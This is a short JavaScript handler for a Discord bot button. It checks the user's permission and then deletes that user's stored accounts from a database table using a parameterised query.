const { queryParams } = require("../../../db/database");
const accountsmsg = require("../../../autosecure/utils/accounts/accountsmsg");
const isOwner = require("../../../db/isOwner");

module.exports = {
    name: "deleteaccounts",
    callback: async (client, interaction) => {
        let [t, id, current] = interaction.customId.split("|");
        current = parseInt(current) || 1;

        const isUserOwner = await isOwner(interaction.user.id);
        if (id && interaction.user.id !== id && !isUserOwner) {
            return interaction.reply({ content: "You do not have permission to delete these accounts.", ephemeral: true });
        }

        const effectiveUserId = isUserOwner ? id : interaction.user.id;
        // Delete all accounts for the user
        await queryParams(`DELETE FROM accountsbyuser WHERE user_id=?`, [effectiveUserId]);

        // Reset current to 1 since all accounts are deleted
        current = 1;

        // Return to the accounts message with the updated current page
        return interaction.update(await accountsmsg(effectiveUserId, current));
    }
};